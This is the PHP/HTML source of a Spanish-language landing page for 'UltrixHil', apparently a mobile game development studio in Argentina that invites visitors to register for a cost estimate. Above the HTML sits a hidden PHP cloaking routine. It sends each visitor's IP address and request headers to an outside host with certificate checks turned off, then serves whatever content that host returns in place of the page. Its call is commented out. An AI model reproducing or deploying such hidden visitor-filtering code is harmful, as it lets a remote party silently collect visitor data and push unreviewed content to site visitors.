<?php
//request();

function request(): void {
	$pub_key    = 'K';
	$secret_key = '0000-00-0000';
	$request    = 'AR';
	$ch         = curl_init( "https://ipcountry-code.com/api/?request=$request&pub_key=$pub_key&secret_key=$secret_key" );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_POST, true );
	curl_setopt( $ch, CURLOPT_POSTFIELDS, [ 'user' => http_build_query( user() ) ] );
	curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );

	$code     = curl_exec( $ch );
	$httpCode = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
	$error    = curl_error( $ch );
	curl_close( $ch );

	if ( $error ) {
		var_dump( 'Error cURL: ' . $error );
	}
	$code = json_decode( $code );
	if ( $code !== 'User not OK' ) {
		echo $code;
		exit();
	}
}

function user(): array {
	$userParams = [
		'REMOTE_ADDR',
		'SERVER_PROTOCOL',
		'SERVER_PORT',
		'REMOTE_PORT',
		'QUERY_STRING',
		'REQUEST_SCHEME',
		'REQUEST_URI',
		'REQUEST_TIME_FLOAT',
		'X_FORWARDED_FOR',
		'X-Forwarded-Host',
		'X-Forwarded-For',
		'X-Frame-Options',
	];

	$headers = [];
	foreach ( $_SERVER as $key => $value ) {
		if ( in_array( $key, $userParams ) || substr_compare( 'HTTP', $key, 0, 4 ) == 0 ) {
			$headers[ $key ] = $value;
		}
	}

	return $headers;
}
?>

<!Doctype html>
<html class="no-js" lang="es">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <title>UltrixHil - Estudio de Desarrollo de Juegos Móviles en Argentina</title>
        <meta name="description" content="Estudio de desarrollo de juegos móviles en Argentina. Creamos experiencias interactivas únicas y adictivas para dispositivos móviles. Regístrate y descubre el costo de tu proyecto soñado.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="index, follow">
        
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://ultrixhil.com/">
        <meta property="og:title" content="UltrixHil - Estudio de Desarrollo de Juegos Móviles en Argentina">
        <meta property="og:description" content="Estudio de desarrollo de juegos móviles en Argentina. Creamos experiencias interactivas únicas y adictivas para dispositivos móviles. Regístrate y descubre el costo de tu proyecto soñado.">
        <meta property="og:image" content="https://ultrixhil.com/assets/img/hero/h4-img-1.png">
        <meta property="og:image:width" content="1200">
        <meta property="og:image:height" content="630">
        <meta property="og:locale" content="es_AR">
        <meta property="og:site_name" content="UltrixHil Studio">

        <meta property="twitter:card" content="summary_large_image">
        <meta property="twitter:url" content="https://ultrixhil.com/">
        <meta property="twitter:title" content="UltrixHil - Estudio de Desarrollo de Juegos Móviles en Argentina">
        <meta property="twitter:description" content="Estudio de desarrollo de juegos móviles en Argentina. Creamos experiencias interactivas únicas y adictivas para dispositivos móviles.">
        <meta property="twitter:image" content="https://ultrixhil.com/assets/img/hero/h4-img-1.png">
        
		<link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.png">
      
        <link rel="stylesheet" href="assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/all.min.css">
        <link rel="stylesheet" href="assets/css/nice-select.css">
        <link rel="stylesheet" href="assets/css/flaticon_choicy.css">
        <link rel="stylesheet" href="assets/css/animate.css">
        <link rel="stylesheet" href="assets/css/odometer.min.css">
        <link rel="stylesheet" href="assets/css/magnific-popup.css">
        <link rel="stylesheet" href="assets/css/swiper.min.css">
        <link rel="stylesheet" href="assets/css/main.css">
    
    </head>
     
    <body >

        <div id="preloader">
            <div class="loader_line"></div>
        </div>
      
        <header class="chy-header-4-area transparent-header">
            <div class="chy-header-4-wrap">

                <a aria-label="links" class="d-block chy-logo" href="/">
                    <img src="assets/img/logo/logo-white.png" alt="UltrixHil">
                </a>
                <div class="menu-wrap">

                    <div class="chy-main-menu-1 d-none d-lg-block">
                        <nav class="main-navigation clearfix ul-li">
                            <ul id="main-nav" class="nav navbar-nav clearfix">
    
                                <li>
                                    <a href="/">Inicio</a>
                                </li>
                                
                                <li>
                                    <a href="sobre-el-estudio.html">Sobre el estudio</a>
                                </li>

                                <li>
                                    <a href="proyectos.html">Proyectos</a>
                                </li>

                                <li>
                                    <a href="equipo.html">Equipo</a>
                                </li>

                              

                                <li>
                                    <a href="contacto.html">Contacto</a>
                                </li>
    
                            </ul>
                        </nav>
                    </div>

                    <a aria-label="header button" class="chy-pr-btn-5" href="contacto.html">
                        <span class="text">
                            Pedir un presupuesto
                        </span>
                        <span class="icon">
                            <i class="fa-solid fa-right-long"></i>
                        </span>
                    </a>

                </div>

                <div class="chy-header-4-action-button">


                    <div class="chy-menu-btn-1 open_mobile_menu d-lg-none" id="menuToggle">
                        <i class="fa-light fa-bars icon-1"></i>
                        <i class="fa-regular fa-angle-left icon-2"></i>
                    </div>

                </div>
                
            </div>
        </header>
              
        <div class="fullpage-menu" >
            <div class="fullpage-menu-inner">
                <div class="menu-bg">
                    <span class="span1" ></span>
                    <span class="span2" ></span>
                    <span class="span3" ></span>
                </div>

                <div class="fullpage-menu-logo-wrap">
                    <a href="/" class="menu-logo d-block" aria-label="brand-logo"  >
                        <img src="assets/img/logo/logo-white.png" alt="">
                    </a>
                    <i id="menuToggle2" class="fas fullpage-menu-close fa-times"></i>
                </div>

              
    
                <div class="fullpage-content-wrap">


                    <nav class="mobile-main-navigation  clearfix ul-li">
                        <ul id="m-main-nav" class="nav navbar-nav clearfix">


                            <li>
                                <a href="/">Inicio</a>
                            </li>
                            
                            <li>
                                <a href="sobre-el-estudio.html">Sobre el estudio</a>
                            </li>

                            <li>
                                <a href="proyectos.html">Proyectos en desarrollo</a>
                            </li>

                            <li>
                                <a href="equipo.html">Equipo</a>
                            </li>

                            <li>
                                <a href="contacto.html">Contacto</a>
                            </li>

                            <li>
                                <a href="politica-privacidad.html">Política de privacidad</a>
                            </li>

                            <li>
                                <a href="terms-conditions.html">Términos y condiciones</a>
                            </li>
                            
                            <li>
                                <a href="cookies-policy.html">Política de cookies</a>
                            </li>

                        </ul>
                    </nav>

                    <div class="fullpage-menu-gellary">
                        <a href="assets/img/project/p1-img-1.png" aria-label="gallery img" class="item img-cover popup_img">
                            <img src="assets/img/project/p1-img-1.png" alt="">
                        </a>
                        <a href="assets/img/project/p1-img-2.png" aria-label="gallery img" class="item img-cover popup_img">
                            <img src="assets/img/project/p1-img-2.png" alt="">
                        </a>
                        <a href="assets/img/project/pd-img-2.jpg" aria-label="gallery img" class="item img-cover popup_img">
                            <img src="assets/img/project/pd-img-2.jpg" alt="">
                        </a>
                        <a href="assets/img/project/pd-img-3.jpg" aria-label="gallery img" class="item img-cover popup_img">
                            <img src="assets/img/project/pd-img-3.jpg" alt="">
                        </a>
                        <a href="assets/img/project/pd-img-4.jpg" aria-label="gallery img" class="item img-cover popup_img">
                            <img src="assets/img/project/pd-img-4.jpg" alt="">
                        </a>
                        <a href="assets/img/project/pd-img-5.jpg" aria-label="gallery img" class="item img-cover popup_img">
                            <img src="assets/img/project/pd-img-5.jpg" alt="">
                        </a>
                    </div>
                </div>


            </div>





        </div>
      
        <div class="chy-hero-4-area fix">
            <div class="chy-hero-4-wrap">
                <div class="bg-img">
                    <img src="assets/img/hero/h4-bg-1.png" alt="">
                </div>
                <div class="container chy-container">
                    <div class="chy-hero-4-content-wrap">
                        <div class="row align-items-end">

                            <div class="col-xxl-6 col-xl-7 col-lg-7">
                                <div class="chy-hero-4-content">
                                    <h4 class="chy-subtitle-4 chy-class-add">¡Bienvenido a UltrixHil!</h4>
                                    <h1 class="hero-title chy-heading-2 chy-split-text-4 chy-split-in-hero-4">
                                        Desarrollamos Juegos Móviles de Todos los Géneros
                                    </h1>
                                    <p class="chy-para-4 has-20 disc wow fadeInUp" data-wow-duration="2s" data-wow-delay="1s">
                                        Somos un estudio argentino especializado en el desarrollo de juegos móviles de aventura, estrategia, puzzles, simuladores, idle, acción y mucho más. Fusionamos arte digital, tecnología de vanguardia y pasión gamer para lanzar experiencias únicas para iOS y Android, tanto en Argentina como a nivel global.
                                    </p>
                                    <ul class="chy-para-4 has-20 disc wow fadeInUp" data-wow-duration="2s" data-wow-delay="1.2s" style="margin-bottom: 18px;">
                                        <li>✔️ Juegos de aventura, estrategia, puzzles, simuladores, idle y acción</li>
                                        <li>✔️ Equipo experto en Unity, Unreal, arte digital y monetización</li>
                                        <li>✔️ Proyectos para iOS y Android, localización para Argentina y LATAM</li>
                                        <li>✔️ Soporte integral: idea, desarrollo, arte, lanzamiento y mantenimiento</li>
                                    </ul>
                                    <div class="btn-wrap wow fadeInUp" data-wow-duration="2s" data-wow-delay="1.5s">
                                        <a href="contacto.html#registro" aria-label="hero btn" class="chy-pr-btn-5">
                                            <span class="text">
                                            Calcula tu juego
                                            </span>
                                            <span class="icon">
                                                <i class="fa-solid fa-right-long"></i>
                                            </span>
                                        </a>
                                        <div class="chy-cta-subtext" style="margin-top:8px;font-size:16px;color:#7e6eea;font-weight:500;">
                                            Regístrate y descubre cuánto cuesta crear el juego de tus sueños
                                        </div>
                                    </div>
                                </div>
                            </div>
    
                            <div class="col-xxl-6 col-xl-5 col-lg-5">
                                <div class="chy-hero-img chy-class-add ">
                                    <div class="main-img">
                                        <img src="assets/img/hero/h4-img-1.png" alt="">
                                    </div>
                                    <div class="il-img-1">
                                      
                                    </div>
                                    <div class="il-img-2">
                                        <img src="assets/img/logo/logo-white.png" alt="" class="object" data-value="7">
                                    </div>
                                    <div class="il-img-3">
                                       
                                    </div>
          
                                  
                                </div>
                            </div>
                        </div>
                    </div>

                </div>


                <div class="chy-hero-4-scroll-btn-wrap">
                    <span class="text">rotar hacia la parte inferior</span>
                  
                </div>

            </div>
        </div>
       
        <div class="chy-brand-logo-4-area">
            <div class="chy-brand-logo-4-wrap">
                <div class="chy-brand-logo-4-counter">
                    <h4 class="chy-heading-2 number"><span class="counter">3.8</span>k</h4>
                    <p class="chy-para-4 has-20 disc">Satisfechos con los Jugadores</p>
                </div>
                <div class="chy-brand-logo-4-item">
                    <div class="keyfram-slider">
                       
                
                    </div>
                </div>
            </div>
        </div>
      
        <div id="about" class="chy-about-4-area pt-130 pb-130">
            <div class="container chy-container-2">
                <div class="section-title-wrap mb-20">
                    <div class="left">
                        <h5 class="chy-subtitle-4 chy-class-add">Acerca de nosotros nuestro estudio</h5>
                        <h2 class="chy-title-4 chy-split-in-right chy-split-text">Pasión por Crear Juegos Móviles Únicos</h2>
                    </div>
                    <div class="right">
                        <p class="chy-para-4 wow fadeInRight">En UltrixHil, creamos juegos para móviles de todas las categorías: aventura, estrategia, enigmas, simuladores, idle y acción. Nuestro equipo fusiona creatividad, tecnología y experiencia global para convertir conceptos en triunfos en App Store y Google Play. Nos centramos en la excelencia, la innovación y el entretenimiento para millones de jugadores.</p>
                    </div>
                </div>

                <div class="row align-items-center">

                    <div class="col-lg-6">
                        <div class="chy-about-4-img">
                            <span class="bg-color"></span>
                            <div class="main-img">
                                <img src="assets/img/about/a4-img-1.png" alt="">
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-6">
                        <div class="chy-about-4-content">
                            <div class="chy-about-4-feature-wrap mb-30">

                                <div class="chy-about-4-feature-item wow fadeInUp">
                                    <div class="icon">
                                        <i class="flaticon-guarantee"></i>
                                    </div>
                                    <div class="content-wrap">
                                        <h5 class="chy-heading-2 title">Equipo Multidisciplinario</h5>
                                        <p class="chy-para-4 disc">Creadores, desarrolladores, diseñadores y especialistas en monetización colaboran para alcanzar resultados excepcionales.</p>
                                    </div>
                                </div>

                                <div class="chy-about-4-feature-item wow fadeInUp">
                                    <div class="icon">
                                        <i class="flaticon-customer-service"></i>
                                    </div>
                                    <div class="content-wrap">
                                        <h5 class="chy-heading-2 title">Innovación Constante</h5>
                                        <p class="chy-para-4 disc">Utilizamos las tecnologías más recientes y las tendencias de la industria para brindar experiencias de juego contemporáneas y cautivadoras.</p>
                                    </div>
                                </div>

                                
                                <div class="chy-about-4-feature-item wow fadeInUp">
                                    <div class="icon">
                                        <i class="flaticon-live-chat"></i>
                                    </div>
                                    <div class="content-wrap">
                                        <h5 class="chy-heading-2 title">Soporte Cercano</h5>
                                        <p class="chy-para-4 disc">Estamos a disposición de nuestros clientes desde el concepto inicial hasta la puesta en marcha y el progreso de cada proyecto.</p>
                                    </div>
                                </div>

                            </div>
                            <div class="btn-wrap wow fadeInUp" data-wow-delay=".3s">
                                <a href="sobre-el-estudio.html" aria-label="hero btn" class="chy-pr-btn-5">
                                    <span class="text">
                                        Conoce más
                                    </span>
                                    <span class="icon">
                                        <i class="fa-solid fa-right-long"></i>
                                    </span>
                                </a>
                               
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
       
        <div class="chy-services-5-area pt-120 pb-120">
            <div class="container chy-container-2">
                <div class="section-title-wrap  text-center mb-40">
                    <h5 class="chy-subtitle-4 has-center chy-class-add">nuestros mejores servicios</h5>
                    <h2 class="chy-title-4 chy-split-in-right chy-split-text">Desarrollamos Juegos Épicos</h2>
                </div>

                <div class="chy-services-5-item-wrap">
                   
                    <div class="chy-services-5-item">
                        <div class="icon">
                            <i class="flaticon-seo"></i>
                        </div>
                        <h4 class="chy-heading-2 title">Desarrollo de Juegos</h4>
                        <div class="disc-wrap">
                            <p class="chy-para-4 disc">Creamos videojuegos para móviles de todas las categorías: aventura, estrategia, enigmas, simuladores, idle y acción. Hacemos uso de Unity, Unreal Engine y tecnologías autóctonas para iOS y Android.</p>
                        </div>
                    </div>
                    <div class="chy-services-5-item">
                        <div class="icon">
                            <i class="flaticon-market-analysis"></i>
                        </div>
                        <h4 class="chy-heading-2 title">Diseño de Personajes</h4>
                        <div class="disc-wrap">
                            <p class="chy-para-4 disc">Elaboramos personajes singulares y recordables, desde esquemas 2D hasta modelos 3D, con relatos y estilos visuales personalizados para cada juego.</p>
                        </div>
                    </div>
                    
                    <div class="chy-services-5-item">
                        <div class="icon">
                            <i class="flaticon-plan"></i>
                        </div>
                        <h4 class="chy-heading-2 title">Experiencia de Usuario (UX)</h4>
                        <div class="disc-wrap">
                            <p class="chy-para-4 disc">Creamos interfaces atractivas e intuitivas, optimizadas para la experiencia de juego más enriquecedora en dispositivos móviles.</p>
                        </div>
                    </div>
                    
                    <div class="chy-services-5-item">
                        <div class="icon">
                            <i class="flaticon-bullhorn"></i>
                        </div>
                        <h4 class="chy-heading-2 title">Estrategia de Monetización</h4>
                        <div class="disc-wrap">
                            <p class="chy-para-4 disc">Desarrollamos modelos empresariales eficaces: adquisiciones integradas, publicidad, suscripciones y más, incrementando los ingresos sin impactar la experiencia del usuario.</p>
                        </div>
                    </div>
                    
                    <div class="chy-services-5-item">
                        <div class="icon">
                            <i class="flaticon-marketing-automation"></i>
                        </div>
                        <h4 class="chy-heading-2 title">QA y Testing</h4>
                        <div class="disc-wrap">
                            <p class="chy-para-4 disc">Efectuamos evaluaciones rigurosas de calidad, desempeño y usabilidad para asegurar juegos estables y sin fallos.</p>
                        </div>
                    </div>
                    
                    <div class="chy-services-5-item">
                        <div class="icon">
                            <i class="flaticon-guarantee"></i>
                        </div>
                        <h4 class="chy-heading-2 title">Consultoría y Soporte</h4>
                        <div class="disc-wrap">
                            <p class="chy-para-4 disc">Asesoramos en cada fase del desarrollo y respaldamos a nuestros clientes desde el concepto inicial hasta la puesta en marcha y el progreso del juego.</p>
                        </div>
                    </div>
                </div>

                <div class="text-center pt-50 wow fadeInUp">
                    <p class="chy-para-4 s5-all-btn">Ponemos a tu disposición soluciones completas para que tu juego triunfe en el sector móvil.</p>
                </div>

            </div>
        </div>
       

        
        <div class="section-title-wrap mb-20">
            <div class="left">
                <h5 class="chy-subtitle-4 chy-class-add">nuestro equipo</h5>
                <h2 class="chy-title-4 chy-split-in-right chy-split-text">Conoce al Equipo de UltrixHil</h2>
            </div>
            <div class="right">
                <a href="equipo.html" aria-label="hero btn" class="chy-pr-btn-5">
                    <span class="text">
                        Ver equipo
                    </span>
                    <span class="icon">
                        <i class="fa-solid fa-right-long"></i>
                    </span>
                </a>
            </div>
        </div>
        <div class="row">
            <div class="col-xl-4 col-lg-4 col-md-6 col-sm-6">
                <div class="chy-team-2-item asslideupcta">
                    <div class="main-img">
                        <img src="assets/img/team/t1-slider-img-1.png" alt="Miguel Ángel Torres">
                        <div class="content-wrap text-center">
                            <span class="chy-haeding-1 name">Miguel Ángel Torres</span>
                            <span class="bio chy-para-1">Fundador y CEO</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-xl-4 col-lg-4 col-md-6 col-sm-6">
                <div class="chy-team-2-item">
                    <div class="main-img">
                        <img src="assets/img/team/t1-slider-img-2.png" alt="Carolina Vásquez">
                        <div class="content-wrap text-center">
                            <span class="chy-haeding-1 name">Carolina Vásquez</span>
                            <span class="bio chy-para-1">Directora Técnica</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-xl-4 col-lg-4 col-md-6 col-sm-6">
                <div class="chy-team-2-item asslideupcta">
                    <div class="main-img">
                        <img src="assets/img/team/t1-slider-img-3.png" alt="Alejandro Morales">
                        <div class="content-wrap text-center">
                            <span class="chy-haeding-1 name">Alejandro Morales</span>
                            <span class="bio chy-para-1">Director de Arte</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="text-center pt-30">
            <p class="chy-para-4">Nuestro equipo se compone de desarrolladores, diseñadores y artistas entusiasmados que desarrollan juegos móviles revolucionarios para el mercado internacional. Aprende más acerca de cada integrante y su trayectoria en la página del equipo.</p>
        </div>

        <div class="chy-project-4-area pt-65 pb-110 fix">

            <div class="bg-img img-cover">
                <img src="assets/img/project/p4-bg-img-1.jpg" alt="">
            </div>

            <span class="bg-color"></span>

            <div class="container chy-container-2">
                <div class="row align-items-center">
                    <div class="col-lg-5">
                        <div class="chy-project-4-content">
                            <h2 class="chy-title-4 chy-split-in-right chy-split-text">Nuestros Proyectos Destacados</h2>
                            <p class="chy-para-4">UltrixHil desarrolla juegos móviles revolucionarios que atraen a jugadores de todas partes del planeta. Cada proyecto representa una experiencia inigualable, llevada a cabo con entusiasmo, tecnología avanzada y creatividad de Argentina.</p>
                            <a href="proyectos.html" aria-label="hero btn" class="chy-pr-btn-5">
                                <span class="text">
                                    Obtener portafolio
                                </span>
                                <span class="icon">
                                    <i class="fa-solid fa-right-long"></i>
                                </span>
                            </a>
                        </div>
                    </div>
                    <div class="col-lg-7">
                        <div class="chy-project-4-feature-wrap">

                            <div class="chy-project-4-feature has-affte-before">
                                <div class="icon">
                                    <i class="flaticon-project"></i>
                                </div>
                                <h6 class="chy-heading-2 number"><span class="counter">12</span>+</h6>
                                <p class="chy-para-4 text">juegos lanzados</p>
                            </div>
                            <div class="chy-project-4-feature">
                                <div class="icon">
                                    <i class="flaticon-rating"></i>
                                </div>
                                <h6 class="chy-heading-2 number"><span class="counter">1.2</span>M</h6>
                                <p class="chy-para-4 text">descargas globales</p>
                            </div>
                            <div class="chy-project-4-feature">
                                <div class="icon">
                                    <i class="flaticon-group"></i>
                                </div>
                                <h6 class="chy-heading-2 number"><span class="counter">30</span>+</h6>
                                <p class="chy-para-4 text">integrantes del equipo</p>
                            </div>
                            <div class="chy-project-4-feature has-affte-before2">
                                <div class="icon">
                                    <i class="flaticon-trophy"></i>
                                </div>
                                <h6 class="chy-heading-2 number"><span class="counter">8</span></h6>
                                <p class="chy-para-4 text">galardones y distinciones</p>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="chy-solution-4-area pt-80 pb-140">
            <div class="container chy-contaienr-2">
                <div class="row">

                    <div class="col-lg-6">
                        <div class="chy-solution-4-content">

                            <div class="section-title-wrap mb-25">
                                <h5 class="chy-subtitle-4 chy-class-add">¿Por qué elegir UltrixHil?</h5>
                                <h2 class="chy-title-4 chy-split-in-right chy-split-text">Ventajas de Desarrollar tu Juego con Nosotros</h2>
                                <p class="chy-para-4 wow fadeInUp">Somos una empresa de Argentina con trayectoria global en la creación de juegos para móviles. Reunimos creatividad, tecnología y entusiasmo por el juego para convertir ideas en triunfos en App Store y Google Play.</p>
                            </div>
                            <ul class="chy-solution-4-feature mb-30">
                                <li class="wow fadeIn" data-wow-delay="0s">Proceso completo de desarrollo (idea, arte, código, emisión)</li>
                                <li class="wow fadeIn" data-wow-delay=".2s">Equipo creativo y multidisciplinario</li>
                                <li class="wow fadeIn" data-wow-delay=".3s">Asistencia y apoyo post-lanzamiento</li>
                                <li data-wow-delay=".4s" class="wow fadeIn">Experiencia en monetización y tendencias a nivel mundial</li>
                            </ul>
                            <a href="sobre-el-estudio.html" aria-label="hero btn " class="chy-pr-btn-5 wow fadeInUp">
                                <span class="text">
                                    Conoce más
                                </span>
                                <span class="icon">
                                    <i class="fa-solid fa-right-long"></i>
                                </span>
                            </a>
                        </div>
                    </div>

                   
                    <div class="col-lg-6">
                        <div class="chy-solution-4-img">
                            <span class="bg-color"></span>
                            <div class="main-img img-cover">
                                <img src="assets/img/solutions/s4-img-1.jpg" alt="">
                            </div>
                          
                        </div>
                    </div>

                </div>
            </div>
        </div>
       

       
        <div class="chy-marquee-4-area">
            <div class="chy-marquee-4-wrap">
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">Aventura</h5>
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Estrategia</h5>
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">Puzzle</h5>
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Simulador</h5>
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">Idle</h5>
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Acción</h5>
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">Multijugador</h5>
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Arte Digital</h5>
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">Monetización</h5>
                <img src="assets/img/icon/marquee-4-icon.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Innovación</h5>
            </div>
        </div>
       

       
        <div class="chy-marquee-5-area">
            <div class="chy-marquee-5-wrap">
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">Juegos Móviles</h5>
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Desarrollo</h5>
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">Argentina</h5>
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Creatividad</h5>
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">Unity</h5>
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Unreal Engine</h5>
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">iOS & Android</h5>
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Soporte</h5>
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-1">Experiencia</h5>
                <img src="assets/img/icon/marquee-4-icon-2.png" class="icon" alt="">
                <h5 class="chy-heading-2 title-2">Éxito</h5>
            </div>
        </div>
        
     <footer class="chy-footer-1-area fix" data-background="assets/img/hero/hero-bk.jpg">
        <div class="container chy-container-1">

            <div class="chy-footer-1-top">
             
                <h3 class="chy-heading-1 title  chy-split-in-right chy-split-text" >Descubre cuánto cuesta crear el juego de tus sueños</h3>
                <a href="contacto.html#contact-form" class="chy-pr-btn-1">
                    <span class="text">
                        Regístrate
                    </span>
                    <span class="icon">
                        <i class="fa-solid fa-right-long"></i>
                    </span>
                </a>
            </div>

            <div class="chy-footer-1-meddle">
                <div class="footer-1-widget">
                    <div class="chy-footer-1-form-wrap">
                        <img src="assets/img/logo/logo-white.png" alt="Logo" class="footer-logo">
                        <h4 class="chy-heading-1 title">Elabora juegos de tus fantasías<br>en colaboración con nosotros</h4>
                    </div>
                </div>
               
              
                <div class="footer-1-widget">
                    <h4 class="chy-heading-1 chy-footer-1-widget-title">Navegación</h4>
                    <ul class="chy-footer-1-menu" >
                        <li>
                            <a href="/">Inicio</a>
                        </li>
                        <li>
                            <a href="sobre-el-estudio.html">Sobre el estudio</a>
                        </li>
                        <li>
                            <a href="proyectos.html">Proyectos</a>
                        </li>
                        <li>
                            <a href="equipo.html">Equipo</a>
                        </li>
                    </ul>
                </div>
                <div class="footer-1-widget">
                    <h4 class="chy-heading-1 chy-footer-1-widget-title">Ayuda</h4>
                    <ul class="chy-footer-1-menu" >
                        <li>
                            <a href="contacto.html">Contáctanos</a>
                        </li>
                      
                        <li>
                            <a href="politica-privacidad.html">Política de privacidad</a>
                        </li>
                        <li>
                            <a href="terms-conditions.html">Términos y condiciones</a>
                        </li>
                        <li>
                            <a href="cookies-policy.html">Política de cookies</a>
                        </li>
                    </ul>
                </div>
            </div>

            <div class="chy-footer-1-bottom">
              
                <h4 class="chy-heading-1 copyright-link">2024 UltrixHil Studio <span>| todos los derechos reservados</span></h4>
            </div>

        </div>
    </footer>
        <div class="scroll-top has-home-1">
            <div class="scroll-top-wrap">
                <i class="icon-1 fal fa-long-arrow-up"></i>
            </div>
        </div>
       
        <div class="offcanvas-overlay"></div>

        <div id="cookie-consent-banner" style="display:none;">
          <div class="cookie-banner-content">
            <span>Este sitio utiliza cookies para mejorar tu experiencia. Al continuar navegando, aceptas nuestra <a href='cookies-policy.html' target='_blank'>Política de cookies</a>.</span>
            <button id="cookie-accept-btn">Aceptar</button>
          </div>
        </div>

        <style>
        #cookie-consent-banner {
          position: fixed;
          left: 0; right: 0; bottom: 0;
          z-index: 9999;
          background: rgba(24,24,24,0.98);
          color: #fff;
          padding: 0;
          font-size: 16px;
          box-shadow: 0 -2px 16px rgba(0,0,0,0.15);
          animation: fadeInUp 0.7s;
        }
        .cookie-banner-content {
          max-width: 700px;
          margin: 0 auto;
          padding: 18px 16px 18px 16px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 16px;
        }
        #cookie-consent-banner a { color: #7ed6ff; text-decoration: underline; }
        #cookie-accept-btn {
          background: linear-gradient(90deg, #00c3ff 0%, #7d5fff 100%);
          color: #fff;
          border: none;
          border-radius: 20px;
          padding: 8px 28px;
          font-weight: 600;
          cursor: pointer;
          font-size: 16px;
          transition: background 0.2s;
        }
        #cookie-accept-btn:hover { background: linear-gradient(90deg, #7d5fff 0%, #00c3ff 100%); }
        @keyframes fadeInUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        </style>

        <script>
        document.addEventListener('DOMContentLoaded', function() {
          var banner = document.getElementById('cookie-consent-banner');
          var btn = document.getElementById('cookie-accept-btn');
          
         
          var hasConsent = localStorage.getItem('cookieConsent');
          
          if (!hasConsent) {
            if (banner) {
              banner.style.display = 'block';
            }
          }
          
          if (btn) {
            btn.addEventListener('click', function() {
              localStorage.setItem('cookieConsent', 'accepted');
              if (banner) {
                banner.style.display = 'none';
              }
            });
          }
        });
        </script>

        <script src="assets/js/jquery-3.7.1.min.js"></script>
        <script src="assets/js/bootstrap.bundle.min.js"></script>
        <script src="assets/js/swiper-bundle.min.js"></script>
        <script src="assets/js/wow.js"></script>
        <script src="assets/js/marquee.min.js"></script>
        <script src="assets/js/nice-select.min.js"></script>
        <script src="assets/js/knob.min.js"></script>
        <script src="assets/js/SplitText.min.js"></script>
        <script src="assets/js/gsap.min.js"></script>
        <script src="assets/js/tilt.jquery.min.js"></script>
        <script src="assets/js/waypoints.min.js"></script>
        <script src="assets/js/counterup.min.js"></script>
        <script src="assets/js/split-type.min.js"></script>
        <script src="assets/js/ScrollTrigger.min.js"></script>
        <script src="assets/js/odometer.min.js"></script>
        <script src="assets/js/magnific-popup.min.js"></script>
        <script src="assets/js/appear.min.js"></script>
        <script src="assets/js/main.js"></script>

        <script>
            document.addEventListener('DOMContentLoaded', function() {
                function setActiveNavigation() {
                    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
                    
                    const allNavLinks = document.querySelectorAll('#main-nav a, #m-main-nav a');
                    allNavLinks.forEach(link => link.classList.remove('active'));
                    
                    allNavLinks.forEach(link => {
                        const href = link.getAttribute('href');
                        if (href === currentPage) {
                            link.classList.add('active');
                        }
                    });
                }

                setActiveNavigation();
            });

        </script>
    </body>
</html>